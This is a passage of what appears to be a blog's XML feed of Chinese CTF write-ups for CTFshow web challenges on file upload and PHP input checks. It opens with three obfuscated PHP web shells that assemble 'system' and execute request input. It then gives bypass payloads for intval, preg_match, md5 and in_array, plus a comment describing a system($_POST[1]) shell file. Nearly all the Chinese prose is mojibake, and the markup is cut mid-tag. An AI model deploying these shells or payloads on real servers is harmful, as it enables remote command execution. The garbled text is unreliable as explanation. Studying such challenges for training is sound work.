class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1s'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'ystem'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'metsys'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h4><p>æ—¥å¿—åŒ…å«</p><p>ä¸è¿‡index.phpéœ€è¦è‡ªå·±ä¸Šä¼ </p><h4 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h4><p>åŒ169</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-php</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-php/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-php/</url>
      
        <content type="html"><![CDATA[<h4 id="web89-æ•°ç»„ç»•è¿‡"><a href="#web89-æ•°ç»„ç»•è¿‡" class="headerlink" title="web89(æ•°ç»„ç»•è¿‡)"></a>web89(æ•°ç»„ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åˆ†æä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œæ­£åˆ™åŒ¹é…0-9ï¼ŒåŒ¹é…åˆ°åˆ™è¿”å›trueï¼Œç›´æ¥dieï¼Œä½†æ˜¯ç”±äºpreg_match()åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„æ˜¯æ•°ç»„æ—¶å°†ä¼šè¿”å›false,ä»è€Œç»•è¿‡æ­»äº¡å‡½æ•°ã€‚</p><p>**intval()<strong>å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</strong>intval()**å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡varçš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç»™intval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªéç©ºçš„æ•°ç»„æ—¶ï¼Œintval()å‡½æ•°å°†ä¼šè¿”å›1ï¼Œç»“åˆæˆ‘ä»¬preg_match()ä¼ å…¥æ•°ç»„è¿”å›falseçš„ç‰¹æ€§ï¼Œè¿™é“é¢˜çš„payloadå°±å¾ˆæ¸…æ¥šäº†ã€‚</p><p>Payload:<code>?num[]=1</code></p><h4 id="web90-intval"><a href="#web90-intval" class="headerlink" title="web90(intval)"></a>web90(intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>intval($var,$base)ï¼Œå…¶ä¸­varå¿…å¡«ï¼Œbaseå¯é€‰ï¼Œè¿™é‡Œbase&#x3D;0,åˆ™è¡¨ç¤ºæ ¹æ®varå¼€å§‹çš„æ•°å­—å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š 0xæˆ–0Xå¼€å¤´ä½¿ç”¨åå…­è¿›åˆ¶ï¼Œ0å¼€å¤´ä½¿ç”¨å…«è¿›åˆ¶ï¼Œå¦åˆ™ä½¿ç”¨åè¿›åˆ¶ã€‚</p><p>è¿™é‡Œ&#x3D;&#x3D;&#x3D;è¡¨ç¤ºç±»å‹å’Œæ•°å€¼å¿…é¡»ç›¸ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨4476çš„å…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶ç»•è¿‡æ£€æµ‹ã€‚</p><p>Paylodï¼š</p><blockquote><p>num&#x3D;010574</p><p>num&#x3D;0x117c</p></blockquote><p>intval() è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ã€‚è¾“å…¥çš„å€¼å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒè¿”å›çš„å†…å®¹å–å†³äºç¬¬ä¸€ä¸ªå­—ç¬¦å·¦ä¾§çš„æ•°å­—ã€‚å¦‚ intval(â€˜11a22â€™)&#x3D;11ã€‚</p><blockquote><p>num&#x3D;4476a</p><p>num&#x3D;+4476</p><p>â€¦</p></blockquote><p>æ ¹æ®ä»¥ä¸‹è§£é‡Šï¼Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ¥ç»•è¿‡ä¸å«æ•°å­—è€Œä¸”intvalå–æ•´æ•°</p><h5 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a><a href="https://www.nssctf.cn/problem/2076">[NSSCTF 2022 Spring Recruit]babyphp</a></h5><pre class="language-none"><code class="language-none">é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ value çš„ int æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_WARNING é”™è¯¯å¹¶è¿”å› 1ã€‚ echo intval(array());                 &#x2F;&#x2F; 0echo intval(array(&#39;foo&#39;, &#39;bar&#39;));     &#x2F;&#x2F; 1</code></pre><h4 id="web91-preg-match-m"><a href="#web91-preg-match-m" class="headerlink" title="web91(preg_match  &#x2F;m)"></a>web91(preg_match  &#x2F;m)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">Apache HTTPD æ¢è¡Œè§£ææ¼æ´(CVE-2017-15715)ä¸æ‹“å±•</a></p><p>è€ƒå¯Ÿäº†preg_matchçš„&#x2F;mæ¨¡å¼  </p><p>imæ¨¡å¼æ˜¯å¯ä»¥åŒ¹é…å¾ˆå¤šè¡Œ  iæ¨¡å¼åªèƒ½åŒ¹é…ä¸€è¡Œ</p><p>%0aæ¢è¡Œï¼Œç›¸å½“äºenter</p><p>Payloadï¼š</p><blockquote><p>cmd&#x3D;%0aphp</p><p>cmd&#x3D;php%0a1</p></blockquote><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><p>å’Œ90å¾ˆåƒä¸è¿‡ç¬¬ä¸€ä¸ªæ¯”è¾ƒå¹¶ä¸æ˜¯å¼ºç±»å‹ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ç®€å•çš„4476aæˆ–è€…4476.æ¥ç»•è¿‡ï¼Œå…¶ä»–éƒ½å¯ä»¥</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ä½†æ˜¯å¯ä»¥ä½¿ç”¨8è¿›åˆ¶</p><p>Payload: <code>num=010574</code></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™æ®µä»£ç ä¸­çš„ if(!strpos($num, â€œ0â€)){} è¡Œä½¿ç”¨äº† PHP ä¸­çš„ strpos() å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ç‰¹å®šå­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚é€æ­¥è§£é‡Šè¿™æ®µä»£ç çš„é€»è¾‘ï¼š 1.strpos($num, â€œ0â€)ï¼šè¿™éƒ¨åˆ†ä»£ç è°ƒç”¨äº† strpos() å‡½æ•°ï¼Œç”¨äºåœ¨ $num å˜é‡ä¸­æŸ¥æ‰¾å­—ç¬¦ â€œ0â€ ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™è¿”å›è¯¥ä½ç½®çš„ç´¢å¼•å€¼ï¼ˆç´¢å¼•å€¼ä»0å¼€å§‹ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™è¿”å› falseã€‚</p><p>æ‰€ä»¥å¼€å§‹ä¸èƒ½æœ‰0ï¼Œä½†æ˜¯å¿…é¡»å¾—æœ‰0ï¼Œè€Œä¸”åˆšå¥½ç¬¬ä¸€ä¸ªæ¢æˆäº†å¼ºæ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨4476.0</p><p>çœ‹å…¶ä»–wpæ˜¯åœ¨å‰é¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œä¹Ÿå°±æ˜¯%20ä¹Ÿå¯ä»¥ä½¿ç”¨%0a</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><p>ç¬¬ä¸€ä¸ªæ”¹å›å»äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨4476.0å…¶ä»–Payloadå¯ä»¥</p><h4 id="web96-ç»•è¿‡"><a href="#web96-ç»•è¿‡" class="headerlink" title="web96(.&#x2F;ç»•è¿‡)"></a>web96(.&#x2F;ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åœ¨Linuxä¸‹.&#x2F;è¡¨ç¤ºå½“å‰ç›®å½•</p><p>Payload:<code>u=./flag.php</code></p><h4 id="web97-md5æ•°ç»„ç»•è¿‡"><a href="#web97-md5æ•°ç»„ç»•è¿‡" class="headerlink" title="web97(md5æ•°ç»„ç»•è¿‡)"></a>web97(md5æ•°ç»„ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> </code></pre><p>è¿™ä¸€é“é¢˜æ¶‰åŠåˆ°äº†å¼ºæ¯”è¾ƒçš„md5ç±»å‹ï¼Œä»ä»£ç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œè¦æ±‚aã€bä¸¤ä¸ªå€¼ä¸ä¸€æ ·ä½†æ˜¯éœ€è¦è¿™ä¸¤ä¸ªå€¼å¾—md5å€¼ä¸€æ ·ï¼Œå› æ­¤å¼ºæ¯”è¾ƒç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨md5å‡½æ•°å¤„ç†æ•°ç»„ç±»å‹ä¼šè¿”å›falseçš„ç‰¹æ€§ï¼Œä»è€Œåˆ©ç”¨false&#x3D;falseæ¥ç»•è¿‡ã€‚</p><p><a href="https://www.freebuf.com/articles/web/321300.html">CTFçŸ¥è¯†ç‚¹ï¼š å…³äºPHPè¿ç®—ç¬¦&#x3D;&#x3D;&#x3D; ä¸&#x3D;&#x3D;çš„æ€»ç»“</a></p><h4 id="web98-ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€-å¼•ç”¨"><a href="#web98-ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€-å¼•ç”¨" class="headerlink" title="web98(ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) )"></a>web98(ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>çœ‹å®Œä¸€å¤´é›¾æ°´</p><p><a href="https://www.php.cn/php-notebook-172859.html">phpå‡½æ•°çš„ä¼ å€¼ä¸ä¼ å€(å¼•ç”¨)è¯¦è§£</a></p><p>è€ƒç‚¹æ˜¯PHPé‡Œé¢çš„ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) ä¼ å€(å¼•ç”¨)æœ‰ç‚¹åƒcè¯­è¨€é‡Œé¢çš„åœ°å€ æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸€ä¸‹ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token comment">//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°å€)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ GETä¸€ä¸ª?1(å› ä¸ºGETä¼ å€¼è°ƒç”¨äº†POSTï¼Œæ‰€ä»¥æ— æ‰€è°“) åŠ  POSTä¸€ä¸ªHTTP_FLAG&#x3D;flag </p><h4 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99(in_array)"></a>web99(in_array)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®ä¸ºæ•°ç»„</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å‘æ•°ç»„é‡Œé¢æ’å…¥éšæœºæ•°</span><span class="token punctuation">&#125;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢eg:n=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å†™å…¥1.phpæ–‡ä»¶ å†…å®¹æ˜¯&lt;?php system($_POST[1]);</span><span class="token delimiter important">?></span></span>&#125;?></code></pre><p>array_pushâ€”â€”å¾€æ•°ç»„å°¾éƒ¨æ’å…¥å…ƒç´ 